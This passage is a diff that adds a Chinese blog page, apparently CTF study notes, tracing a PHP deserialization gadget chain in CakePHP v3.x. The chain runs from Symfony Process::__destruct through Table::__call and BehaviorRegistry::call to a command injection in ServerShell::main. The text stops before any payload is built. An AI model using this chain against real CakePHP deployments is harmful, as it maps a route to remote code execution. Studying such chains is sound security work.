@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言之前走了走TP6.x的框架反序列化，今天学一学其他框架的走一走cakephp三个版本的反序列化，就可以试着做一做suctf的pop题了   cakephp[v3.x]配置环境的话直接去github上找源码就行了入口类在vendor\Symfony\Component\Process 1234public function __destruct()&#123;    $this-&gt;stop">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记cakephp框架反序列化">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="前言之前走了走TP6.x的框架反序列化，今天学一学其他框架的走一走cakephp三个版本的反序列化，就可以试着做一做suctf的pop题了   cakephp[v3.x]配置环境的话直接去github上找源码就行了入口类在vendor\Symfony\Component\Process 1234public function __destruct()&#123;    $this-&gt;stop">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-22T13:40:20.000Z">
+<meta property="article:modified_time" content="2025-09-22T13:41:05.689Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="cakephp">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>记cakephp框架反序列化</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/wmctf-pdf2text/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=记cakephp框架反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=记cakephp框架反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=记cakephp框架反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记cakephp框架反序列化&body=Check out this article: https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=记cakephp框架反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=记cakephp框架反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=记cakephp框架反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=记cakephp框架反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=记cakephp框架反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=记cakephp框架反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cakephp-v3-x"><span class="toc-number">2.</span> <span class="toc-text">cakephp[v3.x]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cakephp-v4-x"><span class="toc-number">3.</span> <span class="toc-text">cakephp[v4.x]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cakephp-v5-x"><span class="toc-number">4.</span> <span class="toc-text">cakephp[v5.x]</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        记cakephp框架反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-22T13:40:20.000Z" class="dt-published" itemprop="datePublished">2025-09-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/php/">php</a> › <a class="category-link" href="/categories/php/cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">cakephp框架反序列化</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/cakephp/" rel="tag">cakephp</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前走了走TP6.x的框架反序列化，今天学一学其他框架的<br>走一走cakephp三个版本的反序列化，就可以试着做一做suctf的pop题了  </p>
+<h2 id="cakephp-v3-x"><a href="#cakephp-v3-x" class="headerlink" title="cakephp[v3.x]"></a>cakephp[v3.x]</h2><p>配置环境的话直接去github上找源码就行了<br>入口类在<code>vendor\Symfony\Component\Process</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">stop</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>跟进  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stop</span>(<span class="params"><span class="variable">$timeout</span> = <span class="number">10</span>, <span class="variable">$signal</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$timeoutMicro</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) + <span class="variable">$timeout</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRunning</span>()) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doSignal</span>(<span class="number">15</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">usleep</span>(<span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRunning</span>() &amp;&amp; <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) &lt; <span class="variable">$timeoutMicro</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRunning</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doSignal</span>(<span class="variable">$signal</span> ?: <span class="number">9</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>跟进isRunning方法  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isRunning</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">STATUS_STARTED</span> !== <span class="variable language_">$this</span>-&gt;status) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateStatus</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;processInformation[<span class="string">&#x27;running&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>跟进updateStatus方法有前置条件，但是status可控，跟进  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateStatus</span>(<span class="params"><span class="variable">$blocking</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">STATUS_STARTED</span> !== <span class="variable language_">$this</span>-&gt;status) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;processInformation = <span class="title function_ invoke__">proc_get_status</span>(<span class="variable">$this</span>-&gt;process);</span><br><span class="line">    <span class="variable">$running</span> = <span class="variable language_">$this</span>-&gt;processInformation[<span class="string">&#x27;running&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readPipes</span>(<span class="variable">$running</span> &amp;&amp; <span class="variable">$blocking</span>, <span class="string">&#x27;\\&#x27;</span> !== \DIRECTORY_SEPARATOR || !<span class="variable">$running</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fallbackStatus &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isSigchildEnabled</span>()) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processInformation = <span class="variable language_">$this</span>-&gt;fallbackStatus + <span class="variable language_">$this</span>-&gt;processInformation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$running</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>跟进readPipes方法  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPipes</span>(<span class="params"><span class="keyword">bool</span> <span class="variable">$blocking</span>, <span class="keyword">bool</span> <span class="variable">$close</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;processPipes-&gt;<span class="title function_ invoke__">readAndWrite</span>(<span class="variable">$blocking</span>, <span class="variable">$close</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$callback</span> = <span class="variable language_">$this</span>-&gt;callback;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$type</span> =&gt; <span class="variable">$data</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">3</span> !== <span class="variable">$type</span>) &#123;</span><br><span class="line">            <span class="variable">$callback</span>(<span class="built_in">self</span>::<span class="variable constant_">STDOUT</span> === <span class="variable">$type</span> ? <span class="built_in">self</span>::<span class="variable constant_">OUT</span> : <span class="built_in">self</span>::<span class="variable constant_">ERR</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;fallbackStatus[<span class="string">&#x27;signaled&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fallbackStatus[<span class="string">&#x27;exitcode&#x27;</span>] = (<span class="keyword">int</span>) <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这边processPipes可控，可以调用__call魔术方法<br>找到<code>vendor\cakephp\cakephp\src\ORM\Table.php</code><br>命名空间:namespace Cake\ORM</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_behaviors &amp;&amp; <span class="variable language_">$this</span>-&gt;_behaviors-&gt;<span class="title function_ invoke__">hasMethod</span>(<span class="variable">$method</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_behaviors-&gt;<span class="title function_ invoke__">call</span>(<span class="variable">$method</span>, <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^find(?:\w+)?By/&#x27;</span>, <span class="variable">$method</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_dynamicFinder</span>(<span class="variable">$method</span>, <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(</span><br><span class="line">        <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Unknown method &quot;%s&quot;&#x27;</span>, <span class="variable">$method</span>)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>调用任意类的call方法<br>找到<code>vendor\cakephp\cakephp\src\ORM\BehaviorRegistry.php</code><br>命名空间:namespace Cake\ORM</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"><span class="variable">$method</span>, <span class="keyword">array</span> <span class="variable">$args</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">hasMethod</span>(<span class="variable">$method</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$this</span>-&gt;_methodMap[<span class="variable">$method</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$behavior</span>, <span class="variable">$callMethod</span>) = <span class="variable language_">$this</span>-&gt;_methodMap[<span class="variable">$method</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>-&gt;_loaded[<span class="variable">$behavior</span>], <span class="variable">$callMethod</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(</span><br><span class="line">        <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Cannot call &quot;%s&quot; it does not belong to any attached behavior.&#x27;</span>, <span class="variable">$method</span>)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>存在一个call_user_func_array，可以调用任意类的任意方法<br>这个时候的<code>$method=readAndWrite</code><br>找一下它的条件  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;hasMethod</span><br><span class="line">$this-&gt;has</span><br></pre></td></tr></table></figure></div>
+<p>跟进  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasMethod</span>(<span class="params"><span class="variable">$method</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$method</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_methodMap[<span class="variable">$method</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>$this-&gt;_methodMap参数可控，过  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">has</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_loaded[<span class="variable">$name</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>$this-&gt;_loaded参数可控，于<code>vendor\cakephp\cakephp\src\Core\ObjectRegistry.php</code>过<br>此时可以利用回调函数调用任意方法<br>找到 <code>vendor\cakephp\cakephp\src\Shell\ServerShell.php</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="title function_ invoke__">sprintf</span>(</span><br><span class="line">        <span class="string">&#x27;php -S %s:%d -t %s&#x27;</span>,</span><br><span class="line">        <span class="variable">$this</span>-&gt;_host,</span><br><span class="line">        <span class="variable">$this</span>-&gt;_port,</span><br><span class="line">        <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$this</span>-&gt;_documentRoot)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;_iniPath)) &#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%s -c %s&#x27;</span>, <span class="variable">$command</span>, <span class="variable">$this</span>-&gt;_iniPath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$command</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%s %s&#x27;</span>, <span class="variable">$command</span>, <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$this</span>-&gt;_documentRoot . <span class="string">&#x27;/index.php&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$port</span> = <span class="string">&#x27;:&#x27;</span> . <span class="variable language_">$this</span>-&gt;_port;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">out</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;built-in server is running in http://%s%s/&#x27;</span>, <span class="variable">$this</span>-&gt;_host, <span class="variable">$port</span>));</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">out</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;You can exit with &lt;info&gt;`CTRL-C`&lt;/info&gt;&#x27;</span>));</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$command</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这里存在拼接命令注入<br>在执行命令之前，还得先让两个$this-&gt;out方法正常返回  </p>
